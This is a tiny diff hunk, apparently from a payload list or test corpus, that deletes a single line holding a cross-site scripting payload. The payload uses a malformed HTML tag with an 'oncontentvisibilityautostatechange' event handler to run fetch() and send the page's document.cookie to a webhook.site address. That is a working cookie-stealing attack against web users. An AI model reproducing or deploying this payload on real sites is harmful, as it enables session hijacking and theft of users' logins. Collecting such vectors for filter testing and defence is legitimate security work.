@@ -1,2 +1,0 @@
-<http:|><x| oncontentvisibilityautostatechange="fetch('https://webhook.site/ef11a938-69ea-4df1-bdab-864576354f26?c='+encodeURIComponent(document.cookie))" style=display:block;content-visibility:auto>
-
